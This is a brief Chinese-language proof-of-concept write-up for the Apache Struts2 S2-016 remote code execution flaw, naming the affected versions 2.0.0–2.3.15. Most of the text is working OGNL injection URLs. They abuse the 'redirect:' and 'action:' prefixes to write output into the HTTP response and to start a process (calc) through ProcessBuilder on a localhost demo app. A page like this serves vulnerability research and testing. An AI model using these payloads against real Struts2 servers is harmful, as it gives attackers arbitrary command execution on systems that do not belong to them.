# Struts2远程代码执行

受影响版本:

- 2.0.0-2.3.15

详情[参看](https://cwiki.apache.org/confluence/display/WW/S2-016),与CVE-2013-2248一样。

POC过程:

<pre>
http://localhost:8080/struts2demo/HelloWorld.action?redirect:%24%7b%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2c%23a%3d%23req.getSession()%2c%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23matt.getWriter().print(%27hacked%27)%2c%23matt.getWriter().flush()%2c%23matt.getWriter().close()%7d
</pre>

简单测试:

<pre>
localhost:8080/struts2demo/HelloWorld.action?action:%2525%7b3*4%7d
</pre>

调用action为3的。  

调用计算器程序,使用redirect来实现:

<pre>
http://localhost:8080/struts2demo/HelloWorld.action?redirect:%24%7b(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27calc%27%7d)).start()%7d
</pre>

结果如下:

![hacker](hacker.jpg)